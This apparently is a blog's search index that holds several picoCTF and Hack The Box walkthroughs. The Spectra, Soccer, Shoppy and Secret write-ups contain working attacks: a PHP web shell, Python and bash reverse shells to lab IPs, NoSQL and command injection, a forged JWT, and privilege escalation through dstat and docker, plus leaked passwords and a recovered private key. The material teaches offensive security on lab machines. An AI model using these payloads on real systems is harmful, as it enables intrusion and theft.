7.5.0crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.7698__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrystatic.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edata__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmain__TMC_END___ITM_registerTMCloneTableflag__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.commentOr we can just use this command:giorgi@darkfears31:~/Desktop/picoctf$ strings static | grep picopicoCTF{d15a5m_t34s3r_1e6a7731}Here we go flag is : picoCTF{d15a5m_t34s3r_1e6a7731}" }, { "title": "Spectra from HTB", "url": "/posts/Spectra-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Spectra from HTBview-source:http://spectra.htb/testing/wp-config.php.savewe get mysqlcredentials|// ** MySQL settings - You can get this info from your web host ** //|||/** The name of the database for WordPress */|||define( 'DB_NAME', 'dev' );||||||/** MySQL database username */|||define( 'DB_USER', 'devtest' );||||||/** MySQL database password */|||define( 'DB_PASSWORD', 'devteam01' );||||||/** MySQL hostname */|||define( 'DB_HOST', 'localhost' );||||||/** Database Charset to use in creating database tables. */|||define( 'DB_CHARSET', 'utf8' );||||||/** The Database Collate type. Don't change this if in doubt. */|||define( 'DB_COLLATE', '' );|||login with Administratordevteam01Upload php cmdas a plugincat wp-maintenance.php&lt;?php/*Plugin Name: WordPress Maintanance PluginPlugin URI: wordpress.orgDescription: WordPress Maintenance ActivitiesAuthor: WordPressVersion: 1.0Author URI: wordpress.org*/system($_GET[\"cmd\"]);?&gt;zip wp-maintenance.zip wp-maintenance.phpthen upload it, activate it and see if it works by on this linkhttp://spectra.htb/main/wp-content/plugins/wp-maintenance/wp-maintenance.php?cmd=iduid=20155(nginx) gid=20156(nginx) groups=20156(nginx)now get reverse shell, wgetdidn’t work so go to revshells.comto get reverse shellpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.3\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'this workedrlwrap nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.16.3] from (UNKNOWN) [10.10.10.229] 38550$ ididuid=20155(nginx) gid=20156(nginx) groups=20156(nginx)with linpeas.shwe get that machineruns on chromeOSwe also find something in /etc/autologin/passwd$ cd /etc/autologincd /etc/autologin$ lslspasswd$ cat passwdcat passwdSummerHereWeCome!!It is password for one of the users.ssh katie@10.10.10.229(katie@10.10.10.229) Password:katie@spectra ~ $User Flag is: e89d27fe195e9114ffa72ba8913a6130***in /etc/init/test.confadd this exec whoami &gt; /tmp/helpnow read the file and if it shows that you are rootinsert reverse shell codeexec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.3\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'and you will get to connection on ncrlwrap nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.16.3] from (UNKNOWN) [10.10.10.229] 38558#Root Flag is: d44519713b889d5e1f9e536d0c6df2fc***" }, { "title": "Specialer from PicoCTF", "url": "/posts/Specialer-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Specialer from PicoCTFpage DescriptionReception of Special has been cool to say the least. That’s why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just ‘Specialer’. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody’s complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer. HintsWhat programs do you have access to?After connecting i found out that i couldn’t use ls nor cat. So from hints i knew that i had to search on what programs i had access to. To not waste time i asked ChatGPT:how to check in SSH what commands i have access to while connected to ssh serverand i got the answer: compgen -c this code worked and got the list on what commands i had access to:ifthenelseelifficaseesacforselectwhileuntildodoneinfunctiontime{}![[]]coproc.:[aliasbgbindbreakbuiltincallercdcommandcompgencompletecompoptcontinuedeclaredirsdisownechoenableevalexecexitexportfalsefcfggetoptshashhelphistoryjobskillletlocallogoutmapfilepopdprintfpushdpwdreadreadarrayreadonlyreturnsetshiftshoptsourcesuspendtesttimestraptruetypetypesetulimitumaskunaliasunsetwaitbashFrom this i only used pwd and echo.First i asked GPT how to list files without using lsand i got this: echo *,printf \"%s\\n\" * and compgen -f. I used echo *Let’s begin:Specialer$ echo *abra ala simSpecialer$ cd abraSpecialer$ echo *cadabra.txt cadaniel.txtSpecialer$ cat cadabra.txt -bash: cat: command not foundSpecialer$ ./cadabra.txxt-bash: ./cadabra.txxt: No such file or directorySpecialer$ ./cadabra.txt-bash: ./cadabra.txt: Permission deniedI couldn’t read file with running it so i had to search other ways e.g. reading file with echoand i got to this in stackoverflow :echo \"$(&lt;a.txt )\"Specialer$ echo \"$( &lt; cadabra.txt)\"Nothing up my sleeve!Specialer$ echo \"$( &lt; cadaniel.txt)\"Yes, I did it! I really did it! I'm a true wizard!It worked! but we didn’t get the flag so let’s search in other directories. After not very long of searching i got to this:Specialer$ cd alaSpecialer$ echo *kazam.txt mode.txtSpecialer$ echo \"$( &lt; kazam.txt)\"return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_d5ef8b71}Here we go the flag is:picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_d5ef8b71}To learn the challenge you can visit this page" }, { "title": "Special from PicoCTF", "url": "/posts/Special-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Special from PicoCTFpage DescriptionDon’t power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized… automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That’s Special (TM)Start your instance to see connection details.ssh -p 56363 ctf-player@saturn.picoctf.netThe password is d8819d45 HintsExperiment with different shell syntaxIn this SSH environment i can’t use normal commands like nano cd ls etc. I’m not that knowledgeable so i had to search up the answer and i came across this:${parameter=&lt;command&gt;}The syntax ${parameter=ls} is specific to the Z Shell (zsh) and can be a bit misleading if taken out of context. This syntax is used for parameter expansion with assignment, where the parameter is assigned the output of the ls command if it is not already set.So this means that parameteris not assigned anywhere so it takes &lt;command&gt;as an argument and $ calls it and it shows the answers.Special$ ${parameter=ls}${parameter=ls} blarghSpecial$ ${parameter=cd blargh}${parameter=cd blargh}${parameter=cat blargh/flag.txt} picoCTF{5p311ch3ck_15_7h3_w0r57_0c61d335}Here we go The flag is:picoCTF{5p311ch3ck_15_7h3_w0r57_0c61d335}" }, { "title": "Soccer from HTB", "url": "/posts/Soccer-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Soccer from HTBnmapgave this:22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)| 256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)|_ 256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Soccer - Index|_http-server-header: nginx/1.18.0 (Ubuntu)9091/tcp open xmltec-xmlmail?add this to /etc/hosts:10.10.11.194 soccer.htbThen access the site and perform directory searchwith ffuf or gobusterand you will discoversoccer.htb/tinyDirectory and there is an login page. Name is Tiny File ManagerSearch that and in Githubrepository you will find https://github.com/prasathmani/tinyfilemanagerwhereDefault username/password: admin/admin@123 and user/12345Try it. And you will login after using admin admin@123Find /tiny&gt; /uploadsYou can upload reverse-shell-php.phpand then click uploaded file to execute it.URL should look somewhat like this: http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&amp;view=reverse.phpAfter that you will get connection on netcatnc -nvlp 1234listening on [any] 1234 ...connect to [10.10.16.5] from (UNKNOWN) [10.10.11.194] 50044Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux 14:12:31 up 13 min, 0 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ script /dev/null -c bashScript started, file is /dev/nullwww-data@soccer:/$You need to use listin this directoryls -la /etc/nginx/sites-enabled/total 8drwxr-xr-x 2 root root 4096 Dec 1 2022 .drwxr-xr-x 8 root root 4096 Nov 17 2022 ..lrwxrwxrwx 1 root root 34 Nov 17 2022 default -&gt; /etc/nginx/sites-available/defaultlrwxrwxrwx 1 root root 41 Nov 17 2022 soc-player.htb -&gt; /etc/nginx/sites-available/soc-player.htbThere it is you found an needed subdomainwhich is soc-player.soccer.htbadd it to /etc/hosts:10.10.11.194 soc-player.soccer.htbAccess that subdomain. Then signupand perform sql injectionwith sqlmap:sqlmap -u \"ws://soc-player.soccer.htb:9091\" --data '{\"id\": \"*\"}' --dbs --threads 10 -- level 5 --risk 3 --batchAfter minutes you will get database: soccer_db read it:sqlmap -u \"ws://soc-player.soccer.htb:9091\" --data '{\"id\": \"*\"}' --threads 10 -D soccer_db --dump --batchAnd you will get name and password:player ——- PlayerOftheMatch2022Connect to sshwith that.**User Flag is: 0a9918ca7ce3703124ef1338bf6c2696**sudo -lgave nothing.Looking for files with the SUID bit set, we stumble upon the /usr/bin/doas binary, which is an alternative to the more commonly used sudo binary:find / -type f -perm -4000 2&gt;/dev/nullThis will list this:/usr/local/bin/doas/usr/lib/snapd/snap-confine/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/eject/dmcrypt-get-device/usr/bin/umount/usr/bin/fusermount/usr/bin/mount/usr/bin/su/usr/bin/newgrp/usr/bin/chfn/usr/bin/sudo/usr/bin/passwd/usr/bin/gpasswd/usr/bin/chsh/usr/bin/at/snap/snapd/17883/usr/lib/snapd/snap-confine/snap/core20/1695/usr/bin/chfn/snap/core20/1695/usr/bin/chsh/snap/core20/1695/usr/bin/gpasswd/snap/core20/1695/usr/bin/mount/snap/core20/1695/usr/bin/newgrp/snap/core20/1695/usr/bin/passwd/snap/core20/1695/usr/bin/su/snap/core20/1695/usr/bin/sudo/snap/core20/1695/usr/bin/umount/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core20/1695/usr/lib/openssh/ssh-keysignThen readcat /usr/local/etc/doas.confpermit nopass player as root cmd /usr/bin/dstatThis means we can use dstatwith root privileges.Reading manual for dstatwe find this:FILES Paths that may contain external dstat_*.py plugins: ~/.dstat/ (path of binary)/plugins/ /usr/share/dstat/ /usr/local/share/dstat/So we must create an dstat_shell.pyin directory where we can.I created it in /usr/local/share/dstatwith codes:echo 'import os; os.system(\"/bin/bash\")' &gt; /usr/local/share/dstat/dstat_shell.pyThen execute it like this:/usr/local/bin/doas /usr/bin/dstat --pwnIt will spawn root shell.**Root Flag is: df13042d98034989daa88dc8d5586ec4**" }, { "title": "Sleuthkit Apprentice from PicoCTF", "url": "/posts/Sleuthkit-Apprentice-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Sleuthkit Apprentice from PicoCTFpage DescriptionDownload this disk image and find the flag.Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory. Download compressed disk image So from the title we have to use sleuthkit.First gunzip disk.flag.img.gz Then use sleuthkit on the disk.flag.img:$ mmls disk.flag.img DOS Partition TableOffset Sector: 0Units are in 512-byte sectors Slot Start End Length Description000: Meta 0000000000 0000000000 0000000001 Primary Table (#0)001: ------- 0000000000 0000002047 0000002048 Unallocated002: 000:000 0000002048 0000206847 0000204800 Linux (0x83)003: 000:001 0000206848 0000360447 0000153600 Linux Swap / Solaris x86 (0x82)004: 000:002 0000360448 0000614399 0000253952 Linux (0x83)-------------------------------------------------------------------------$ fls -o 360448 disk.flag.img d/d 451:\thomed/d 11:\tlost+foundd/d 12:\tbootd/d 1985:\tetcd/d 1986:\tprocd/d 1987:\tdevd/d 1988:\ttmpd/d 1989:\tlibd/d 1990:\tvard/d 3969:\tusrd/d 3970:\tbind/d 1991:\tsbind/d 1992:\tmediad/d 1993:\tmntd/d 1994:\toptd/d 1995:\trootd/d 1996:\trund/d 1997:\tsrvd/d 1998:\tsysd/d 2358:\tswapV/V 31745:\t$OrphanFiles----------------------------------------------------------------$ fls -o 360448 disk.flag.img 1995r/r 2363:\t.ash_historyd/d 3981:\tmy_folder----------------------------------------------------------------$ fls -o 360448 disk.flag.img 3981r/r * 2082(realloc):\tflag.txtr/r 2371:\tflag.uni.txt------------------------------------------------------$ icat -o 360448 disk.flag.img 2082 3.449677 13.056403$ icat -o 360448 disk.flag.img 2371picoCTF{by73_5urf3r_adac6cb4}And the is the flag:picoCTF{by73_5urf3r_adac6cb4}" }, { "title": "Shoppy from HTB", "url": "/posts/Shoppy-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Shoppy from HTBadd this to /etc/hosts10.10.11.180 shoppy.htbAccess the site and we see that there is nothing.Run gobusterfor directory busting and ffuffor subdomains. for fuf use /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txtBefore that finishes find out on what languagedoes site operate on.Try to get 404code and with that we can learn sum.Cannot GET /helpCannot GET searching that tells us that site runs on Node-JSWith gobuster we found loginpage. Go to that and then perform nosql-injectionadmin'||'1'=='1 &lt;---- in usernamee.g. help &lt;---- in passwordThen loginClick search for usersand then perform same injection but now in url. It has to be url-encoded.url-encodedhttp://shoppy.htb/admin/search-users?username=admin%27%7C%7C%271%27%3D%3D%271Then you will get this.[ { \"_id\": \"62db0e93d6d6a999a66ee67a\", \"username\": \"admin\", \"password\": \"23c6877d9e2b564ef8b32c3a23de27b2\" }, { \"_id\": \"62db0e93d6d6a999a66ee67b\", \"username\": \"josh\", \"password\": \"6ebcea65320589ca4f2f1ce039975995\" }]Go to cracstationand paste both password. You will get password for joshand it’s : remembermethisway. You can’t access sshwith this.So then maybe there is an subdomain.ffuffound mattermostsubdomain so add it to /etc/hosts10.10.11.180 mattermost.shoppy.htbThen access it.In Deploy Machinechat you will find this:Hey @josh,For the deploy machine,you can create an account with these creds username: jaeger password: Sh0ppyBest@pp!Go to sshand log in with this creds.**User Flag is: c6acc5b48213051b19adc3ae540c7240**$ sudo -l[sudo] password for jaeger:Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-managerYou’ll need password for this password-manageryou will find it with this:strings -e l /home/deploy/password-managerSampleThen run it. You will get password for deploy. Become the deployuser.iduid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)We are in dockergroup. With this you can always become the rootdeploy@shoppy:~$ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESdocker imagesREPOSITORY TAG IMAGE ID CREATED SIZEalpine latest d7d3d98c851f 2 years ago 5.53MBdeploy@shoppy:~$ docker run --rm -it -v /:/mnt alpine /bin/sh/ # cd mnt/mnt # chroot .The command docker run --rm -it -v /:/mnt alpine /bin/sh is used to run a Docker container with the following options: docker run: This command is used to start a new Docker container. --rm: Automatically removes the container when it exits. This prevents unused containers from accumulating on your system. -it: Combines -i (interactive) and -t (pseudo-TTY), allowing you to interact with the container via the terminal. -v /:/mnt: This mounts the host machine’s root directory (/) to the container’s /mnt directory. Essentially, the container will have access to the entire file system of the host under the /mnt directory. alpine: This specifies the Docker image to use, in this case, alpine, which is a small, minimalistic Linux distribution. /bin/sh: This is the command to be run inside the container, starting a shell session (/bin/sh) in the Alpine container.What This Command Does: It starts an Alpine Linux container. It provides you with an interactive shell inside the container. It gives the container access to the host machine’s entire file system, mounted at /mnt.Potential Risks:This command gives the container unrestricted access to your entire host file system, which can be dangerous if not handled with care, as it could potentially modify or delete critical files on the host system.**Root Flag is: 063a18189ade4a31fbf52b970fab80a1**" }, { "title": "Serpentine from PicoCTF", "url": "/posts/Serpentine-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Serpentine from PicoCTFpage DescriptionFind the flag in the Python script.While examining provided code we find that none of the choices provide flag. while True: print('a) Print encouragement') print('b) Print flag') print('c) Quit\\n') choice = input('What would you like to do? (a/b/c) ') if choice == 'a': print_encouragement() elif choice == 'b': print('\\nOops! I must have misplaced the print_flag function! Check my source code!\\n\\n') elif choice == 'c': sys.exit(0)Let’s go search what function gives us the flag. After bit searching we find function :flag_enc = chr(0x15) + chr(0x07) + chr(0x08) + chr(0x06) + chr(0x27) + chr(0x21) + chr(0x23) + chr(0x15) + chr(0x5c) + chr(0x01) + chr(0x57) + chr(0x2a) + chr(0x17) + chr(0x5e) + chr(0x5f) + chr(0x0d) + chr(0x3b) + chr(0x19) + chr(0x56) + chr(0x5b) + chr(0x5e) + chr(0x36) + chr(0x53) + chr(0x07) + chr(0x51) + chr(0x18) + chr(0x58) + chr(0x05) + chr(0x57) + chr(0x11) + chr(0x3a) + chr(0x0f) + chr(0x0a) + chr(0x5b) + chr(0x57) + chr(0x41) + chr(0x55) + chr(0x0c) + chr(0x59) + chr(0x14)def print_flag(): flag = str_xor(flag_enc, 'enkidu') print(flag)def print_flag() function decrypts encrypted flag. So lets take this function and give it to one of the Choice e.g.if choice == 'a': print_encouragement()|||if choice == 'a': print_flag()and save it.Run the saved program and in choices choose a :giorgi@darkfears31:~/Desktop$ python3 serpentine.py Y .-^-. / \\ .- ~ ~ -.() () / _ _ `. _ _ _ \\_ _/ / / \\ \\ . ~ _ _ ~ . | | / / \\ \\ .' .~ ~-. `. | | / / ) ) / / `.`. \\ \\_ _/ / / / / / `' \\_ _ _.' / / ( ( / / \\ \\ / / \\ \\ / / ) ) ( ( / / `. `. .' / `. ~ - - - - ~ .' ~ . _ _ _ _ . ~Welcome to the serpentine encourager!a) Print encouragementb) Print flagc) QuitWhat would you like to do? (a/b/c) apicoCTF{7h3_r04d_l355_7r4v3l3d_aa2340b2}a) Print encouragementb) Print flagc) QuitWe got the flag: picoCTF{7h3_r04d_l355_7r4v3l3d_aa2340b2}" }, { "title": "Secret from HTB", "url": "/posts/Secret-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Secret from HTBnmapgave this:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)| 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)|_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: DUMB Docs3000/tcp open http Node.js (Express middleware)|_http-title: DUMB Docsfrom 80port we can download source code which is on the bottom.$ uznip file.zip$ cd /local-web/.git$ git log-------------commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78Author: dasithsv &lt;dasithsv@gmail.com&gt;Date: Fri Sep 3 11:30:17 2021 +05304b89867504baccd93a removed .env for security reasons$ git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE+TOKEN_SECRET = secretects/0f/e5720dbee18484942ab0d67ddfc9c0a160287 ects/f8/80e2b582071fdcf8f7f3a81782c8275abc48Thengit showcommit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -&gt; master)--------------+router.get('/logs', verifytoken, (req, res) =&gt; {+ const file = req.query.file;+ const userinfo = { name: req.user }+ const name = userinfo.name.name;++ if (name == 'theadmin'){+ const getLogs = `git log --oneline ${file}`;+ exec(getLogs, (err , output) =&gt;{+ if(err){+ res.status(500).send(err);+ return+ }+ res.json(output);+ })+ }+ else{+ res.json({+ role: {+ role: \"you are normal user\",+ desc: userinfo.name.name+ }+ })+ } })reading the local-web/routes/auth.js we find this:// loginrouter.post('/login', async (req , res) =&gt; { const { error } = loginValidation(req.body) if (error) return res.status(400).send(error.details[0].message); // check if email is okay const user = await User.findOne({ email: req.body.email }) if (!user) return res.status(400).send('Email is wrong'); // check password const validPass = await bcrypt.compare(req.body.password, user.password) if (!validPass) return res.status(400).send('Password is wrong'); // create jwt const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET ) res.header('auth-token', token).send(token);})This means that the token_secretthat we got is jwtsignature.On site there /docsthere is how token should look like so lets built it that wayCreate an jwttoken with thisHeader { \"alg\": \"HS256\", \"typ\": \"JWT\"}Payload{\"_id\": \"31313131\", \"name\" : \"theadmin\", \"email\" : \"root@dasith.works\", \"iat\" : 1628727669}VERIFY SIGNATURE gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwEand i goteyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIxMjM0NTY3ODkwIiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJoZWxwQGh0Yi5jb20ifQ.FIzE8SZ-bVd5CGgBKKZLgwDoKluGptKT4K2gsPH0fGUthen i used burpsuite + repeater to check if i would be adminGET /api/priv HTTP/1.1Host: 10.10.11.120Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8Sec-GPC: 1Accept-Language: en-US,enAccept-Encoding: gzip, deflate, brConnection: keep-aliveauth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIzMTMxMzEzMSIsIm5hbWUiOiJ0aGVhZG1pbiIsImVtYWlsIjoicm9vdEBkYXNpdGgud29ya3MiLCJpYXQiOjE2Mjg3Mjc2Njl9.12tqqp2h6h_GuYX7THeeF4taq71NA9B4HH2oi1PvpNEAnd i got{\"creds\":{\"role\":\"admin\",\"username\":\"theadmin\",\"desc\":\"welcome back admin\"}}This means we have admin token and can do thingsin this directory we can do this with same payloadGET /api/logs?file=;id HTTP/1.1and response will be\"80bf34c fixed typos 🎉\\n0c75212 now we can view logs from server 😃\\nab3e953 Added the codes\\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\\n\"This means we can do RCE to get reverse shell. In burp do thisGET /api/logs?file=; echo -n 'YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNy8xMjM0ICAwPiYx' | base64 -d | bash HTTP/1.1url-encodethat and we will get reverse shellGET /api/logs?file=;echo+-n+'YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNy8xMjM0ICAwPiYx'+|+base64+-d+|+bash HTTP/1.1on netcatrlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.7] from (UNKNOWN) [10.10.11.120] 37276bash: cannot set terminal process group (1115): Inappropriate ioctl for devicebash: no job control in this shelldasith@secret:~/local-web$ script /dev/null -c bashUser Flag is: 28ae49669c844ba862cd52c38ec85a77***do ssh-keygenif you want sshconnectionlinpeas.shshowed that there is an unusual binary in /optwhich is named countwhich reads files and tells how many words, lines there are reading the source code which is code.c// Enable coredump generation prctl(PR_SET_DUMPABLE, 1);This means that we have to do coredumpand we will be able to read the file.dasith@secret:/opt$ ./countEnter source file/directory name: /root/.ssh/id_rsaTotal characters = 2602Total words = 45Total lines = 39Save results a file? [y/N]: ^Z[1]+ Stopped ./countdasith@secret:/opt$ ps -ef | grep countroot 783 1 0 13:11 ? 00:00:00 /usr/lib/accountsservice/accounts-daemondasith 96640 32354 0 15:12 pts/0 00:00:00 ./countdasith 96644 32354 0 15:12 pts/0 00:00:00 grep --color=auto countdasith@secret:/opt$ kill -11 96640dasith@secret:/opt$ fg./countSegmentation fault (core dumped)It dumped now go to /var/crash/_opt_count.1000.crashand read the coredump with stringsstrings Coredump-----BEGIN OPENSSH PRIVATE KEY-----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